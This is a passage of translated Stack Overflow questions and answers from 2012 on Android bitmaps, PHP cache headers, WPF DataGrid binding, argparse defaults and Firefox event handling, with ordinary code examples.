          fontFamily: 'Calibri',
          fontSize: 12,
          padding: 5,
          visible: false,
          fill: 'black',
          opacity: 0.75,
          textFill: 'white'
        });

        tooltipLayer.add(tooltip);
        stage.add(circlesLayer);
        stage.add(tooltipLayer);
      };

    </script>
  </head>
  <body>
    <div id="container"></div>
  </body>
</html> 
```

# android-imageview - 从 imageview 获取位图图像并将其放入位图变量

> ID：12460985
> 
> 赞同：3
> 
> 时间：2012-09-17T14:04:54.450
> 
> 标签：android-imageview

通过单击一个按钮，我从图库中获取图像并将其设置到图像视图中......这是代码......

```
protected void onActivityResult(int requestCode, int resultCode, Intent data) 
    {
        super.onActivityResult(requestCode, resultCode, data);
        if(requestCode==RESULT_LOAD_IMAGE && resultCode == RESULT_OK && null != data)
        {
              Uri selectedImage = data.getData();
                String[] filePathColumn = { MediaStore.Images.Media.DATA };

                Cursor cursor = getContentResolver().query(selectedImage,
                        filePathColumn, null, null, null);
                cursor.moveToFirst();

                int columnIndex = cursor.getColumnIndex(filePathColumn[0]);
                String picturePath = cursor.getString(columnIndex);
                cursor.close();

                ImageView imageView = (ImageView) findViewById(R.id.iImage);
                imageView.setImageBitmap(BitmapFactory.decodeFile(picturePath));

        }   
    } 
```

现在我想在位图变量中获取此图像，并需要将其作为位图变量添加到数组列表中......有人可以帮助我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-18T05:49:56.403

您可以只为 Bitmap 使用一个变量，例如：

```
Bitmap imagetopass;
imagetopass=BitmapFactory.decodeFile(picturePath); 
```

刚过：

```
imageView.setImageBitmap(BitmapFactory.decodeFile(picturePath)); 
```

然后你可以使用变量 imagetopass。

# php - 在客户端显式缓存 PHP 页面

> ID：12460986
> 
> 赞同：0
> 
> 时间：2012-09-17T14:04:54.910
> 
> 标签：php, apache, browser-cache, cache-control

我有以下 PHP 脚本（比如 cache.php）：

```
<?php
 Header("Cache-Control: public");

 $offset = 60 * 60 * 24 * 3;
 $ExpStr = "Expires: " . gmdate("D, d M Y H:i:s", time() + $offset) . " GMT";
 Header($ExpStr);

 echo "Hello world";
?> 
```

据我了解，这应该使浏览器在第一次访问它时存储其输出的缓存版本，然后在接下来的 3 天内提供此版本，甚至无需向服务器发送请求。不幸的是，情况并非如此（使用 apache 2.2），有没有人有任何有用的见解？（显然我可以在 PHP 脚本中强制使用 304 标头，但这不应该是必需的）

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-19T11:51:22.390

看来我的错误是通过按 F5 检查是否发生缓存，这（与图像、css 等其他资源不同）显式地从服务器获取新条目，而不是呈现存储的条目。为了检查缓存，应该保留指向相关页面的链接（在不同的页面上），并且仅通过单击来检查缓存页面是否已提供服务。

附带说明一下，如果 php 页面正在使用会话，则 session.cache.limiter 也会影响缓存。

# wpf - 如何将数据网格绑定到 wpf 中类的某些属性？

> ID：12460987
> 
> 赞同：5
> 
> 时间：2012-09-17T14:04:56.123
> 
> 标签：wpf, class, data-binding, datagrid

是否可以将数据网格仅绑定到类的**选择性**成员？我目前进行绑定的方式是，所有类变量都已绑定（一对一映射）到数据网格的列。

```
 private void OnPropertyChanged(string property)
    {
        if (PropertyChanged != null)
        {
            PropertyChanged(this, new PropertyChangedEventArgs(property));
        }
    } 
```

现在我只想将几个类属性（不是全部）绑定到数据网格。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-09-17T14:17:21.127

是的，只需关闭 AutoGenerateColumns 并手动指定它们

在 MainWindow.xaml

```
<DataGrid ItemsSource="{Binding}" AutoGenerateColumns="False">
    <DataGrid.Columns>
        <DataGridTextColumn Binding="{Binding Hello}" Header="Hello" />
        <DataGridTextColumn Binding="{Binding World}" Header="World" />
    </DataGrid.Columns>
</DataGrid> 
```

在 MainWindow.xaml.cs

```
 public partial class MainWindow : Window
{
    public MainWindow()
    {
        InitializeComponent();
        DataContext = new[] { new FakeViewModel() };
    }
} 
```

在 FakeViewModel.cs

```
namespace WpfApplication4
{
  class FakeViewModel
  {
    public FakeViewModel()
    {
        Hello = "Hello";
        World = "World";
        Then = DateTime.Now;
    }
    public DateTime Then { get; set; }
    public string Hello { get; set; }
    public string World { get; set; }
  }
} 
```

请注意未使用的属性然后！

# python - argparse：如何允许多个值覆盖默认值

> ID：12460989
> 
> 赞同：12
> 
> 时间：2012-09-17T14:05:02.247
> 
> 标签：python, python-3.x, default-value, argparse

[这与允许多次指定参数](https://stackoverflow.com/questions/5176846/why-does-argparse-give-me-a-list-in-a-list)的问题中涉及的主题略有相关。

**我希望能够像这样多次指定一个选项：**

```
 tool --foo 1 --foo 2 --foo 3 
```

**也像这样：**

```
 tool a b c 
```

我也想同时支持两者：

```
 tool a b c --foo 1 --foo2 --foo 3 
```

这适用于：

```
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('foo', nargs='*', action='append')
parser.add_argument('--foo', nargs='*', dest='foo', action='append') 
```

结果列表可以很容易地展平：

```
args = parser.parse_args('a b c --foo 1 --foo 2 --foo 3'.split())
args.foo = [el for elements in args.foo for el in elements] 
```

产量：

```
>>> args
Namespace(foo=['a', 'b', 'c', '1', '2', '3']) 
```

**如何在用户指定一个参数后立即不使用默认值的方式添加默认值？**

如果仅添加`default=[['spam']]`到其中一个`add_argument()`调用，则默认值始终是结果的一部分。一旦用户自己提供参数，我就无法让 argparse 自行删除它。

我希望有一个`argparse`已经提供的解决方案。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-17T14:17:45.587

我认为这是对另一个答案的更清晰的变体（依赖于`self.default`自定义操作的属性）：

```
import argparse
import sys

class Extender(argparse.Action):
    def __call__(self,parser,namespace,values,option_strings=None):
        #Need None here incase `argparse.SUPPRESS` was supplied for `dest`
        dest = getattr(namespace,self.dest,None) 
        #print dest,self.default,values,option_strings
        if(not hasattr(dest,'extend') or dest == self.default):
            dest = []
            setattr(namespace,self.dest,dest)
            #if default isn't set to None, this method might be called
            # with the default as `values` for other arguements which
            # share this destination.
            parser.set_defaults(**{self.dest:None}) 

        try:
            dest.extend(values)
        except ValueError:
            dest.append(values)

        #another option:
        #if not isinstance(values,basestring):
        #    dest.extend(values)
        #else:
        #    dest.append(values) #It's a string.  Oops.

def new_parser(args):
    parser = argparse.ArgumentParser()
    parser.add_argument('foo', nargs='*',action=Extender)
    parser.add_argument('--foo', nargs='*', dest='foo', action=Extender)
    parser.set_defaults(foo = [['spam']])
    return parser.parse_args(args.split())

tests = {'a b c --foo 1 --foo 2 --foo 3':['a','b','c','1','2','3'],
         '':[['spam']],
         'a b c --foo 1 2 3':['a','b','c','1','2','3'],
         '--foo 1':['1'],
         'a':['a']}

for s,r in tests.items():
    print ( "parsing: {0}".format(s) )
    args = new_parser(s)
    if(args.foo != r):
        print ("ERROR")
        print (args.foo)
        print (r)
        sys.exit(1)
    print ( args )
    print ('*'*80) 
```

* * *

另请注意，我曾经`parser.set_defaults(...)`为`foo`属性设置默认值。

# javascript - Firefox 中的 event.srcElement

> ID：12460999
> 
> 赞同：0
> 
> 时间：2012-09-17T14:05:21.637
> 
> 标签：javascript, internet-explorer, firefox

我有一些旧代码正在更新以在 Firefox 中工作，但我遇到了一个问题。

在代码中，有一个如下所示的函数：

```
function tableEnter() {

     myLocation = event.srcElement;

} 
```

这在 Firefox 中不起作用。我对此进行了相当多的研究，但是我发现的大多数解决方案都需要将一个事件传递给该函数，然后对传递的 e 参数进行操作。...不幸的是，在我正在更新的代码中，我没有传递任何参数。

在没有将任何参数传递给我的函数的情况下，使 event.srcElemet 在 Firefox 中工作的解决方案是什么？

编辑：

好的，问题变成了：如何将事件对象传递给我的 tableEnter() 函数？

这是代码当前正在执行的操作：

```
$(document).ready(function () {
    //make table rows
    //for every new table row...
    myRow.onmouseover = tableEnter; (this is probably a bad name. it should be like..rowEnter. But this is the way I found the code)
}); 
```

现在的问题是，我如何将事件对象传递给 tableEnter() 以便我可以做互联网上建议的事情，以及下面的答案。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:36:19.427

老实说，我不明白为什么你想要访问事件对象，而不是你的处理程序的参数。但是，嘿，这只是我。虽然没有指定参数，但 FF 和 chrome 只是随心所欲，并将事件对象传递给处理程序。所以：

```
function tableEnter()
{
    var evt = window.event || arguments[0];
    var src = evt.target || evt.srcElement;
} 
```

就是这样。就个人而言，我建议你做整个万维网正在做的事情：

```
function handler(e)
{
    e = e || window.event;
    var target = e.target || e.srcElement;
} 
```

由于您使用的是 FF，因此您不应该尝试过多地偏离任何编码约定或标准，无论它们可能多么模糊。*至少*总比没有标准或惯例要好。

* * *

鉴于您的更新，只需将您的函数定义更改为：

```
function tableEnter(e)
{
    //though in jQuery, I suspect e is allready X-browser-proof
    e = e || window.event;
    //just leave ^^this^^ line out, and check in IE: alert(typeof e);
    //if it alerts object, jQuery passed the event object for you
    var theRow = this;//<-- this points to the row that triggered the mouseover
    var jQRow = $(this);//gives you access to jQuery methods

    var target = e.target || e.srcElement;//<-- mainly of importance in delegation
} 
```